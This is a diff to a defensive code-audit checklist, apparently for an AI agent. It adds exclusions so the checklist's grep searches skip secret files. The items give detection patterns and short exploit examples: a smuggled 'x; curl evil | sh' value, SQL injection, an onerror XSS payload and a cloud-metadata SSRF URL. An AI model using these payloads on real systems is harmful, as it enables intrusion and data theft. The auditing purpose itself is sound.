@@ -7,7 +7,8 @@ for, and the typical fix.
 Every search below is one command that passes the read-only guard. Replace UPPERCASE
 placeholders (`APP_DIR`, `MODEL`) with the repo's own paths and names. Exclude vendored code
 (`node_modules`, `vendor`, `.venv`, `dist`, `build`) from conclusions; a hit there is a
-dependency question, not app code.
+dependency question, not app code. Every recursive grep (`-r`) also takes
+`--exclude='.env*' --exclude-dir=.secrets --exclude-dir=.git`, so it never reads secrets.
 
 The finding bar (SKILL.md section 4): no concrete exploit, no finding. It goes under "Worth
 hardening" instead. Framework defaults are not findings unless the code disables them.
@@ -39,7 +40,7 @@ patterns, and never open `.env*` files other than `.env.example`, `.env.sample` 
 ## 2. Mass assignment
 
 - **Models have an allow-list and handlers pass validated fields only.** Evidence:
-  `grep -rnE 'create[(]|update[(]|fill[(]' APP_DIR` next to whole-request input
+  `grep -rnE 'create[(]|update[(]|fill[(]' --exclude='.env*' --exclude-dir=.secrets --exclude-dir=.git APP_DIR` next to whole-request input
   (`request.all()`, `req.body`, `request.POST`, `params.permit!`), models with
   `guarded = []` or no `fillable`, serializers with `fields = '__all__'`. Exploit: add
   `role=admin`, `is_admin=1`, `user_id=OTHER` or `email_verified_at` to a profile update.
@@ -47,20 +48,20 @@ patterns, and never open `.env*` files other than `.env.example`, `.env.sample` 
 
 ## 3. Injection
 
-- **SQL is parameterized.** Evidence: `grep -rnE 'raw[(]|whereRaw|selectRaw|orderByRaw|execute[(]|query[(]|extra[(]|find_by_sql|sanitize_sql' APP_DIR`,
+- **SQL is parameterized.** Evidence: `grep -rnE 'raw[(]|whereRaw|selectRaw|orderByRaw|execute[(]|query[(]|extra[(]|find_by_sql|sanitize_sql' --exclude='.env*' --exclude-dir=.secrets --exclude-dir=.git APP_DIR`,
   then check whether request input is concatenated or interpolated into the string (string
   templates, `+`, f-strings, `#{}`). Sort and column names from the request are a classic
   hole. Exploit: `?sort=id;DROP TABLE` or a `UNION SELECT` in a search box. Fix: bindings for
   values, an allow-list for column and direction names.
 - **Raw HTML sinks get trusted HTML only.** Evidence:
-  `grep -rnE 'dangerouslySetInnerHTML|v-html|innerHTML|html_safe|raw[(]|[|]safe|mark_safe|autoescape off' .`
+  `grep -rnE 'dangerouslySetInnerHTML|v-html|innerHTML|html_safe|raw[(]|[|]safe|mark_safe|autoescape off' --exclude='.env*' --exclude-dir=.secrets --exclude-dir=.git .`
   and Blade's unescaped echo (grep `'[{]!!'`). Trace each sink back: author-only content
   (repo Markdown, admin CMS behind auth) is fine; comments, profiles, form input, query
   strings or imported data is stored or reflected XSS. Exploit: a comment with
   `<img src=x onerror=...>` runs in an admin's session. Fix: escape, or sanitize with an
   allow-list sanitizer (DOMPurify, HTMLPurifier, bleach, `sanitize`) at render time.
 - **No user input reaches a shell, eval or template compiler.** Evidence:
-  `grep -rnE 'exec[(]|spawn[(]|system[(]|shell_exec|passthru|popen|subprocess|child_process|eval[(]|new Function|render_template_string|Template[(]' APP_DIR`.
+  `grep -rnE 'exec[(]|spawn[(]|system[(]|shell_exec|passthru|popen|subprocess|child_process|eval[(]|new Function|render_template_string|Template[(]' --exclude='.env*' --exclude-dir=.secrets --exclude-dir=.git APP_DIR`.
   Exploit: a filename or option like `x; curl evil | sh`. Fix: argument arrays without a
   shell, an allow-list of values, never compile templates from user strings.
 - **Deserialization of untrusted data.** Evidence: `unserialize`, `pickle.loads`,
@@ -75,7 +76,7 @@ patterns, and never open `.env*` files other than `.env.example`, `.env.sample` 
   paths only (and reject `//host`), or an allow-list of hosts.
 - **Server-side fetches of user URLs are fenced.** Evidence: webhooks, URL previews, image
   or PDF fetch, import-from-URL, OAuth or OIDC discovery using a user value
-  (`grep -rnE 'fetch[(]|axios|got[(]|requests[.](get|post)|Http::|file_get_contents|open-uri|Net::HTTP|curl_exec' APP_DIR`).
+  (`grep -rnE 'fetch[(]|axios|got[(]|requests[.](get|post)|Http::|file_get_contents|open-uri|Net::HTTP|curl_exec' --exclude='.env*' --exclude-dir=.secrets --exclude-dir=.git APP_DIR`).
   Exploit: `http://169.254.169.254/` (cloud metadata), `http://localhost:6379`, or a
   redirect that lands there. Fix: allow-list hosts or resolve and block private, loopback
   and link-local ranges on every redirect hop; no `file://` or `gopher://`.
@@ -103,10 +104,11 @@ patterns, and never open `.env*` files other than `.env.example`, `.env.sample` 
 
 - **No secrets in tracked files.** Evidence: `git ls-files | grep -iE '[.]env|[.]pem|id_rsa|credentials|[.]p12'`
   (expect only examples), and
-  `grep -rlE '(api[_-]?key|secret|password|token)[^,]{0,8}[=:] *[A-Za-z0-9/+_-]{16,}' --exclude-dir=node_modules --exclude-dir=vendor .`
-  (file names only). Also look for known prefixes (`sk_live_`, `AKIA`, `ghp_`, `xox`) with
-  `grep -rlE`. Exploit: anyone with repo access, or a leaked clone, gets the key. Fix: rotate
-  the key first, then move it to the secret store; history still holds the old value.
+  `grep -rlE '(api[_-]?key|secret|password|token)[^,]{0,8}[=:] *[A-Za-z0-9/+_-]{16,}' --exclude='.env*' --exclude-dir=.secrets --exclude-dir=.git --exclude-dir=node_modules --exclude-dir=vendor .`
+  (file names only). The `.env*` exclude skips the examples too: read `.env.example`,
+  `.env.sample` or `.env.dist` by name if they exist. Also look for known prefixes
+  (`sk_live_`, `AKIA`, `ghp_`, `xox`) with `grep -rlE` and the same excludes. Exploit: anyone
+  with repo access, or a leaked clone, gets the key. Fix: rotate the key first, then move it to the secret store; history still holds the old value.
 - **Config fails closed.** Evidence: config that falls back to a default secret
   (`env('APP_KEY', 'something')`, `process.env.JWT_SECRET || 'dev'`, `SECRET_KEY = '...'`
   in settings). Exploit: forge sessions or JWTs with the default. Fix: no default; crash at
